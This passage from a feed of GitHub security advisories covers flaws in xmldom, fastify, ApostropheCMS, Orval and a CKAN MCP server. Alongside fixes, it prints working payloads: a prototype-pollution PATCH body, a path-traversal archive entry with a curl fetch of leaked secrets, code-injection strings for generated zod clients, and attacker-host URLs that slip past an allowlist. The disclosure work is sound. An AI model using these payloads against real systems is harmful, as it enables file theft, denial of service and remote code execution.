  console.log(`${e.name}`); // InvalidStateError
}

// A valid name still serializes as &amp;name; under requireWellFormed.
const ok = doc.createEntityReference('valid');
console.log(serializer.serializeToString(ok, { requireWellFormed: true }));
// -&gt; &amp;valid;
</code></pre>
<h3 id="why-the-default-stays-verbatim">Why the default stays verbatim</h3>
<p>The creation-time anchor is applied by default, because it is classified non-breaking. The serializer check, by contrast, stays gated behind <code>{ requireWellFormed: true }</code>: W3C DOM Parsing's require-well-formed flag defaults to <code>false</code>, and the browser <code>XMLSerializer</code> emits the <code>nodeName</code> verbatim in that default mode, so unconditionally throwing for an ill-formed <code>EntityReference.nodeName</code> would be an unjustified breaking change — which is why the default serialization path stays verbatim.</p>
<h3 id="residual-limitation">Residual limitation</h3>
<p>The creation vector is closed by default — the non-breaking creation-time anchor — with no further deferred work. The residual is at serialization: the default path still emits an ill-formed <code>nodeName</code> verbatim, because the serializer check is opt-in via <code>{ requireWellFormed: true }</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6">https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-83610">https://nvd.nist.gov/vuln/detail/CVE-2026-83610</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/1071">https://github.com/xmldom/xmldom/pull/1071</a></li>
<li><a href="https://github.com/xmldom/xmldom/pull/1072">https://github.com/xmldom/xmldom/pull/1072</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b">https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b</a></li>
<li><a href="https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0">https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.8.15">https://github.com/xmldom/xmldom/releases/tag/0.8.15</a></li>
<li><a href="https://github.com/xmldom/xmldom/releases/tag/0.9.12">https://github.com/xmldom/xmldom/releases/tag/0.9.12</a></li>
<li><a href="https://github.com/advisories/GHSA-6gmq-8vp8-gcm6">https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6gmq-8vp8-gcm6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T15:18:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastify] fastify vulnerable to X-Forwarded-* spoofing under trustProxy hop-count]]></title>
        <id>https://github.com/advisories/GHSA-3m5p-2c4r-xxw2</id>
        <link href="https://github.com/advisories/GHSA-3m5p-2c4r-xxw2"/>
        <updated>2026-09-02T15:14:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>The fix for <a href="https://www.cve.org/CVERecord?id=CVE-2026-3635">CVE-2026-3635</a> (<a href="https://github.com/fastify/fastify/security/advisories/GHSA-444r-cwp2-x5xf">GHSA-444r-cwp2-x5xf</a>) added a <code>proxyFn(socket.remoteAddress, 0)</code> guard on the <code>X-Forwarded-*</code> reads in <code>request.host</code>, <code>request.protocol</code>, <code>request.hostname</code>, <code>request.ip</code>, and <code>request.ips</code>. That guard closes the IP, CIDR, and custom-function forms of <code>trustProxy</code> correctly because those forms compile to predicates that inspect the connecting address. The hop-count form (<code>trustProxy: &lt;number&gt;</code>) compiles to a predicate that structurally ignores the address argument, so the guard reduces to <code>0 &lt; tp</code>, always true for any <code>tp &gt;= 1</code>.</p>
<p>Applications configured with <code>trustProxy: &lt;number&gt;</code> (documented as "behind N reverse proxies", <code>trustProxy: 1</code> being the canonical single-proxy setting) remain vulnerable. An attacker who can reach the Fastify origin directly, bypassing the front-facing proxy, can spoof the request fields exactly as in the unpatched version. Impact class matches the parent CVE-2026-3635: host injection in generated URLs, HTTPS-enforcement bypass, secure-cookie / CSRF-origin bypass, host-based routing and cache poisoning.</p>
<h2 id="patches">Patches</h2>
<p>Patched in fastify 5.12.1. The numeric form of <code>trustProxy</code> is now disabled at runtime and removed from the TypeScript type union.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Migrate to an IP / CIDR / custom-function <code>trustProxy</code> value that validates the connecting address. Custom functions must inspect the <code>address</code> argument, not only the hop index.</li>
<li>Ensure the Fastify origin is only reachable through the trusted proxy chain (no direct network path).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify/security/advisories/GHSA-3m5p-2c4r-xxw2">https://github.com/fastify/fastify/security/advisories/GHSA-3m5p-2c4r-xxw2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16732">https://nvd.nist.gov/vuln/detail/CVE-2026-16732</a></li>
<li><a href="https://github.com/fastify/fastify/commit/8acfea7eada05383a7357e3eb21c2628416df280">https://github.com/fastify/fastify/commit/8acfea7eada05383a7357e3eb21c2628416df280</a></li>
<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
<li><a href="https://github.com/fastify/fastify/releases/tag/v5.12.1">https://github.com/fastify/fastify/releases/tag/v5.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-3m5p-2c4r-xxw2">https://github.com/advisories/GHSA-3m5p-2c4r-xxw2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3m5p-2c4r-xxw2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T15:14:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastify] fastify vulnerable to schema validation bypass via root primitive coercion mismatch]]></title>
        <id>https://github.com/advisories/GHSA-w2qp-rph6-63g4</id>
        <link href="https://github.com/advisories/GHSA-w2qp-rph6-63g4"/>
        <updated>2026-09-02T15:13:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>fastify</code> before 5.12.1, when a route uses a root-level primitive body schema (for example an integer with a minimum and maximum) and the default type coercion, validates the coerced value but exposes the original, uncoerced value to the route handler. For example, a JSON body <code>"10"</code> is coerced to the number <code>10</code> and passes an integer 1 to 10 schema, but <code>request.body</code> stays the string <code>"10"</code>. An application that trusts the validated type is handed a value that did not satisfy the schema, which can bypass limits the application enforces on that typed value. Object and array body schemas are not affected, they coerce their members in place.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <code>fastify</code> 5.12.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Until you can upgrade, avoid relying on the validated type of a root primitive body. Wrap the value in an object schema (object properties are coerced in place), for example accept <code>{ "value": 10 }</code> and read <code>request.body.value</code>, or re-check the type in the handler.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify/security/advisories/GHSA-w2qp-rph6-63g4">https://github.com/fastify/fastify/security/advisories/GHSA-w2qp-rph6-63g4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-18504">https://nvd.nist.gov/vuln/detail/CVE-2026-18504</a></li>
<li><a href="https://github.com/fastify/fastify/commit/1ef8a60c87e94f42f666aa15ad68957772a83655">https://github.com/fastify/fastify/commit/1ef8a60c87e94f42f666aa15ad68957772a83655</a></li>
<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
<li><a href="https://github.com/fastify/fastify/releases/tag/v5.12.1">https://github.com/fastify/fastify/releases/tag/v5.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-w2qp-rph6-63g4">https://github.com/advisories/GHSA-w2qp-rph6-63g4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2qp-rph6-63g4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T15:13:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] ApostropheCMS: 2nd-order prototype pollution via PATCH leading to single-request persistent DoS]]></title>
        <id>https://github.com/advisories/GHSA-vmg4-6gfg-83qx</id>
        <link href="https://github.com/advisories/GHSA-vmg4-6gfg-83qx"/>
        <updated>2026-09-02T15:12:42.000Z</updated>
        <content type="html"><![CDATA[<p>The vulnerability is a single-request persistent DoS by submitting e.g.
"PATCH /api/v1/article/" with a valid editor session and body of
{"toString.call":"x"}, overwriting the global toString function with
value x.</p>
<p>Fabian</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vmg4-6gfg-83qx">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-vmg4-6gfg-83qx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71553">https://nvd.nist.gov/vuln/detail/CVE-2026-71553</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/5a3746aaed49761e171c2cbfe793267c959829fd">https://github.com/apostrophecms/apostrophe/commit/5a3746aaed49761e171c2cbfe793267c959829fd</a></li>
<li><a href="https://github.com/advisories/GHSA-vmg4-6gfg-83qx">https://github.com/advisories/GHSA-vmg4-6gfg-83qx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vmg4-6gfg-83qx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-02T15:12:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@apostrophecms/import-export] ApostropheCMS: Arbitrary file read via import-export attachment-name path traversal]]></title>
        <id>https://github.com/advisories/GHSA-79qf-vqgc-7xx3</id>
        <link href="https://github.com/advisories/GHSA-79qf-vqgc-7xx3"/>
        <updated>2026-09-02T14:55:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>@apostrophecms/import-export</code> module reconstructs the on-disk source path of every imported attachment from JSON metadata contained in the uploaded archive.</p>
<p>The archive carries an <code>aposAttachments.json</code> file whose <code>name</code> and <code>extension</code> fields are concatenated into a filesystem path with no traversal check. The zip-slip guard that the module applies during tar extraction validates tar entry names only and does not cover this second path, which is built after extraction.</p>
<p>The file at the resulting path is read and copied into the public uploads directory, then served over HTTP without authentication. A <code>../</code> sequence in <code>name</code> makes the module read a file outside the extraction directory and publish it at an anonymous URL.</p>
<p>Result: an authenticated contributor reads any file on the host whose name ends in an allowlisted extension (other users' uploaded documents, text or CSV dumps, PDFs) by importing a crafted archive and fetching the planted attachment anonymously.</p>
<h2 id="affected">Affected</h2>
<p>apostrophecms/apostrophe with the <code>@apostrophecms/import-export</code> module installed and registered. Module version 3.6.1 (current latest), tested against Apostrophe 4.31.0 (monorepo HEAD 4d478d9). Requires an account with the contributor role or higher; guest and anonymous requests are rejected. The module is not part of the default starter kit, so sites that never installed it are not affected. Files whose real name lacks an accepted file-group extension are not reachable.</p>
<h2 id="root-cause">Root cause</h2>
<p>The import parser builds each attachment's source path by concatenating attacker-controlled JSON fields: <code>lib/formats/gzip.js:46</code> sets <code>file.path = path.join(attachmentFilesPath, ${attachment._id}-${attachment.name}.${attachment.extension})</code> from the <code>aposAttachments.json</code> entries in the uploaded archive. That path flows unchanged through <code>lib/methods/import.js:832</code> (<code>insertAttachments</code>) into <code>lib/methods/import.js:1074</code> (<code>attachment.insert</code>), where uploadfs copies the referenced file into the public uploads directory served by <code>express.static</code>. The archive's only traversal guard, <code>lib/formats/gzip.js:143</code> (<code>if (name.includes('../'))</code>), validates tar entry names during extraction and never inspects the <code>name</code>/<code>extension</code> values used to construct the read path, so a <code>name</code> of <code>../../../../../../tmp/secret</code> escapes <code>attachmentFilesPath</code>. Reaching the sink requires only an authenticated session (<code>lib/methods/import.js:71</code>), view permission on the target type (<code>lib/methods/index.js:54</code>), and the <code>upload-attachment</code> permission enforced at <code>modules/@apostrophecms/attachment/index.js:442</code>, which the built-in contributor role holds. The trailing <code>.${extension}</code> is appended and checked against the file-group allowlist in <code>modules/@apostrophecms/attachment/index.js</code> (<code>getFileGroup</code>), so the target file's real name must end in an accepted extension (txt, csv, pdf, xls, doc, svg, and similar).</p>
<h2 id="reproduction">Reproduction</h2>
<p>Apostrophe 4.31.0 starter-kit-essentials, MongoDB, default roles, <code>@apostrophecms/import-export</code> 3.6.1 installed, local uploadfs backend.</p>
<ol>
<li>Place a secret file outside the upload tree with an allowlisted extension.</li>
</ol>
<pre><code>$ cat /tmp/apos_victim_secret.txt
TOP-SECRET DB DUMP
DB_PASSWORD=Pr0d-Secret-9981
API_KEY=sk_live_victim_abcdef
</code></pre>
<ol start="2">
<li>Build a gzip archive whose <code>aposAttachments.json</code> points the attachment <code>name</code> at that file through traversal (<code>aposDocs.json</code> is <code>[]</code>).</li>
</ol>
<pre><code>[{"_id":"evilatt0001","name":"../../../../../../../../../../../../tmp/apos_victim_secret","extension":"txt","title":"loot","docIds":[],"crops":[]}]
</code></pre>
<ol start="3">
<li>As a contributor, import the archive through the module's import action (<code>POST /api/v1/@apostrophecms/&lt;type&gt;/import-export-import</code>), then fetch the created attachment with no session.</li>
</ol>
<pre><code>$ curl -i http://localhost:3500/uploads/attachments/evilatt0001-apos-victim-secret.txt
HTTP/1.1 200 OK
Content-Type: text/plain; charset=UTF-8

TOP-SECRET DB DUMP
DB_PASSWORD=Pr0d-Secret-9981
API_KEY=sk_live_victim_abcdef
</code></pre>
<p>Live-verified: a contributor-driven import reads <code>/tmp/apos_victim_secret.txt</code> (outside the extraction directory) and serves it at an anonymous URL; the same import run as a guest is rejected at the <code>upload-attachment</code> check (<code>modules/@apostrophecms/attachment/index.js:442</code>).</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Read of arbitrary host files whose real name ends in an allowlisted extension (txt, csv, pdf, xls, doc, svg, and similar).</li>
<li>Disclosure of other users' uploaded documents and any allowlisted-extension file readable by the Node process.</li>
<li>The exfiltration target is copied to a public, unauthenticated URL.</li>
<li>Triggered by the contributor role in a single import, no admin interaction.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://www.turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-79qf-vqgc-7xx3">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-79qf-vqgc-7xx3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63667">https://nvd.nist.gov/vuln/detail/CVE-2026-63667</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/87cccf44a23d09420875ca8a3765eb3db843836a">https://github.com/apostrophecms/apostrophe/commit/87cccf44a23d09420875ca8a3765eb3db843836a</a></li>
<li><a href="https://github.com/advisories/GHSA-79qf-vqgc-7xx3">https://github.com/advisories/GHSA-79qf-vqgc-7xx3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79qf-vqgc-7xx3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-02T14:55:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Generation-time SSRF + remote/local file inclusion via unrestricted $ref]]></title>
        <id>https://github.com/advisories/GHSA-cxq5-97v7-87j8</id>
        <link href="https://github.com/advisories/GHSA-cxq5-97v7-87j8"/>
        <updated>2026-09-02T14:54:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Orval resolves OpenAPI <code>$ref</code>s by fetching remote <code>http(s)</code> URLs and reading local files (including
absolute / out-of-tree paths), inlining the referenced schema into the generated client. Running
<code>orval</code> on a spec whose <code>$ref</code> points at an attacker/internal URL or an arbitrary local file yields
SSRF, remote file inclusion, and local file inclusion. Verified on 8.19.0. This is a different class
from Orval's published output-injection CVEs (CVE-2026-22785/23947/24132/25141), none of which covers
the <code>$ref</code> resolver.</p>
<h3 id="details">Details</h3>
<ul>
<li><code>$ref: http://attacker/internal-evil.json#/...</code> → build host fetches (SSRF) and inlines the remote
schema (RFI); confirmed property <code>REMOTE_ORVAL_PROP</code> in the generated client.</li>
<li><code>$ref: /abs/path.json#/...</code> or <code>../../secret.json#/...</code> → out-of-tree local file read + inlined (LFI).</li>
</ul>
<p>No RCE: on 8.19.0 the description JSDoc is escaped (<code>*/</code>-&gt;<code>*\/</code>, the published fix), so <code>$ref</code> content
cannot break out into code. The chain stops at SSRF + RFI + LFI.</p>
<p>Fix: don't resolve remote <code>$ref</code>s by default (opt-in + host allowlist); confine local <code>$ref</code>
resolution to the input directory tree (reject absolute paths and <code>../</code> escapes).</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> attached: confirms LFI (out-of-tree read), SSRF (listener hit), RFI (remote schema
inlined). Verified on Orval 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Build-time SSRF from the developer or CI host, disclosure of arbitrary local files, and inclusion of untrusted remote content, from running the generator on an attacker-controlled or attacker-influenced OpenAPI description. No code execution (output escaping is in place post the earlier fixes).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-cxq5-97v7-87j8">https://github.com/orval-labs/orval/security/advisories/GHSA-cxq5-97v7-87j8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62680">https://nvd.nist.gov/vuln/detail/CVE-2026-62680</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3723">https://github.com/orval-labs/orval/pull/3723</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/23786c056f4eba38c02bf2968677988dbbe4de10">https://github.com/orval-labs/orval/commit/23786c056f4eba38c02bf2968677988dbbe4de10</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.22.0">https://github.com/orval-labs/orval/releases/tag/v8.22.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cxq5-97v7-87j8">https://github.com/advisories/GHSA-cxq5-97v7-87j8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cxq5-97v7-87j8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-02T14:54:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via query-parameter default -> zod module-level template literal]]></title>
        <id>https://github.com/advisories/GHSA-p4cg-3328-rvfg</id>
        <link href="https://github.com/advisories/GHSA-p4cg-3328-rvfg"/>
        <updated>2026-09-02T14:53:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Orval's zod schema generation emits the <strong>query-parameter</strong> <code>default</code> value as a module-level template literal
(<code>export const …Default = </code><code>;</code>) without escaping <code>${</code> or the backtick. A default of the form
<code>v${&lt;code&gt;}w</code> injects a live JavaScript expression evaluated when the generated zod schema module is
imported, executing attacker-controlled code at import — no request or function call needed. Verified
on Orval 8.19.0; survives default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const …Default = `v${globalThis.ORVPWN()}w`;   // ${...} = arbitrary JS expression, runs at import
</code></pre>
<p>Malicious input: a query parameter with a <code>default</code> of <code>v${&lt;attacker JS&gt;}w</code>. <code>${...}</code> permits any JS expression.</p>
<p>Note: this is one of several <code>default</code>-bearing positions that reach the same unescaped zod
template-literal sink; a single fix (escape <code>default</code> values) closes all of them, and a CNA may choose
to consolidate the related reports.</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the zod schema with default validation, bundles
it, imports it, and shows a marker written at import. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Code execution at import in any application that imports a zod schema module generated from an
attacker-controlled or attacker-influenced OpenAPI description.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Emit <code>default</code> values via a proper string-literal encoder (JSON.stringify, or escape backtick and <code>${</code>
if a template literal must be used); never interpolate a spec value into a template literal. Apply to
every <code>default</code> position.
<a href="https://github.com/user-attachments/files/29399067/maintainer-report.txt">maintainer-report.txt</a>
<a href="https://github.com/user-attachments/files/29399068/make_spec.py">make_spec.py</a>
<a href="https://github.com/user-attachments/files/29399069/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-p4cg-3328-rvfg">https://github.com/orval-labs/orval/security/advisories/GHSA-p4cg-3328-rvfg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-72716">https://nvd.nist.gov/vuln/detail/CVE-2026-72716</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p4cg-3328-rvfg">https://github.com/advisories/GHSA-p4cg-3328-rvfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p4cg-3328-rvfg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-02T14:53:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via schema property name -> computed-property-key injection in the zod client]]></title>
        <id>https://github.com/advisories/GHSA-6mr6-jvcr-2f25</id>
        <link href="https://github.com/advisories/GHSA-6mr6-jvcr-2f25"/>
        <updated>2026-09-02T14:52:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>orval's zod client emits each schema property name as a double-quoted key in the generated zod.object({...})
WITHOUT escaping the double quote. A " in a property name closes the key and lands in object-literal
context, where an injected computed property key [expr] is evaluated when zod.object({...}) runs -- which
is at MODULE IMPORT (the <code>export const X = zod.object({...})</code> executes on load) -&gt; import-time RCE. The
property name is a pure data field. Verified on orval 8.19.0 / Node. CWE-94 / CWE-95 / CWE-116.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const OpBody = zod.object({ "a":zod.string(),[require("fs").writeFileSync("PWNED","")]:zod.string(),"b": zod.string().optional() })
</code></pre>
<p>Sibling: the MSW mock uses a single-quoted key (' breakout, call-time) -- separate report. The TS interface
key is a type (DoS only). Distinct from orval's $ref / route-path / server-url / zod-default findings.</p>
<h3 id="poc">PoC</h3>
<p>reproduce.sh (+ make_spec.py) attached: a property name a":zod.string(),[require("fs").writeFileSync("</p>
<h3 id="impact">Impact</h3>
<p>JavaScript / OS command execution (via child_process) at import time for anyone who generates an orval zod
client from an attacker-controlled spec and imports it. Estimated Critical, e.g.
<code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code>.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Escape the property name for the JS string key (JSON.stringify) in the zod.object key generation; never
interpolate a raw property name adjacent to [ ] in object-literal position.
<a href="https://github.com/user-attachments/files/29426038/maintainer-report.txt">maintainer-report.txt</a>
<a href="https://github.com/user-attachments/files/29426039/make_spec.py">make_spec.py</a>
<a href="https://github.com/user-attachments/files/29426040/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-6mr6-jvcr-2f25">https://github.com/orval-labs/orval/security/advisories/GHSA-6mr6-jvcr-2f25</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71866">https://nvd.nist.gov/vuln/detail/CVE-2026-71866</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6mr6-jvcr-2f25">https://github.com/advisories/GHSA-6mr6-jvcr-2f25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6mr6-jvcr-2f25</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-02T14:52:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@aborruso/ckan-mcp-server] CKAN MCP Server: MQA server allowlist bypass via unanchored regex (`isValidMqaServer`)]]></title>
        <id>https://github.com/advisories/GHSA-83x6-42hr-jc76</id>
        <link href="https://github.com/advisories/GHSA-83x6-42hr-jc76"/>
        <updated>2026-09-02T14:52:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>ckan_get_mqa_quality</code> and <code>ckan_get_mqa_quality_details</code> tools restrict their <code>server_url</code> argument to <code>dati.gov.it</code> via a regular expression. The regex is anchored only at the start and places no boundary after the host, so any URL whose host merely <strong>begins with</strong> <code>dati.gov.it</code> — or that uses <code>dati.gov.it</code> as URL <em>userinfo</em> before an <code>@</code> — passes validation while actually targeting an attacker-controlled host.</p>
<h2 id="affected-code">Affected code</h2>
<pre><code class="language-js">// src/tools/quality.ts
const ALLOWED_SERVER_PATTERNS = [
  /^https?:\/\/(www\.)?dati\.gov\.it/i        // &lt;-- no end anchor / host boundary
];
export function isValidMqaServer(serverUrl: string): boolean {
  return ALLOWED_SERVER_PATTERNS.some(pattern =&gt; pattern.test(serverUrl));
}
</code></pre>
<p>All of the following return <code>true</code>:</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>Real host</th>
</tr>
</thead>
<tbody><tr>
<td><code>https://dati.gov.it.attacker.com/x</code></td>
<td><code>dati.gov.it.attacker.com</code> (attacker)</td>
</tr>
<tr>
<td><code>http://dati.gov.it.evil.example/api</code></td>
<td><code>dati.gov.it.evil.example</code> (attacker)</td>
</tr>
<tr>
<td><code>https://dati.gov.it@attacker.com/x</code></td>
<td><code>attacker.com</code> (userinfo trick)</td>
</tr>
</tbody></table>
<p>After passing this check, <code>server_url</code> flows into <code>getMqaQuality</code>/<code>getMqaQualityDetails</code>, which call <code>makeCkanRequest(serverUrl, "package_show", { id })</code>. The server therefore issues a request to the attacker-controlled host and returns its (parsed) response to the caller.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>The intended "dati.gov.it only" trust boundary for the MQA tools is defeated; they can be driven against arbitrary external hosts.</li>
<li>The attacker host receives the request (including the <code>dataset_id</code>) and controls the response body that is surfaced back to the model/user — enabling response spoofing and, in an agentic setting, indirect prompt-injection content delivered under the guise of a trusted-portal tool.</li>
<li>Contributes to SSRF surface: while <code>makeCkanRequest</code> blocks private/internal IPs, this bypass removes the domain restriction that the code intends to enforce for these tools.</li>
</ul>
<p>The <code>@</code>-userinfo variant is the most severe form because validation passes on a string whose <em>actual</em> host is fully attacker-chosen.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p><code>poc/mqa-allowlist-poc.mjs</code> runs the verbatim regex over benign and malicious URLs:</p>
<pre><code>accepted  expected_legit  url
true      true            https://dati.gov.it/opendata          &lt;- legit
true      false           https://dati.gov.it.attacker.com/x    &lt;- BYPASS
true      false           http://dati.gov.it.evil.example/api   &lt;- BYPASS
true      false           https://dati.gov.it@attacker.com/x    &lt;- BYPASS
</code></pre>
<h2 id="remediation">Remediation</h2>
<p>Validate the parsed host, not the raw string. For example:</p>
<pre><code class="language-js">function isValidMqaServer(serverUrl) {
  let u; try { u = new URL(serverUrl); } catch { return false; }
  if (u.protocol !== "https:") return false;
  const h = u.hostname.toLowerCase();
  return h === "dati.gov.it" || h === "www.dati.gov.it";
  // or: h === "dati.gov.it" || h.endsWith(".dati.gov.it")
}
</code></pre>
<p>Anchoring the regex end-to-end (<code>/^https:\/\/(www\.)?dati\.gov\.it(\/|$)/i</code>) also closes the suffix trick, but URL-parsing + exact host comparison is the robust fix and also neutralizes the <code>@</code>-userinfo variant.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ondata/ckan-mcp-server/security/advisories/GHSA-83x6-42hr-jc76">https://github.com/ondata/ckan-mcp-server/security/advisories/GHSA-83x6-42hr-jc76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73845">https://nvd.nist.gov/vuln/detail/CVE-2026-73845</a></li>
<li><a href="https://github.com/ondata/ckan-mcp-server/commit/8e1522f9bbfa1f3b21550f17887f60f133e24151">https://github.com/ondata/ckan-mcp-server/commit/8e1522f9bbfa1f3b21550f17887f60f133e24151</a></li>
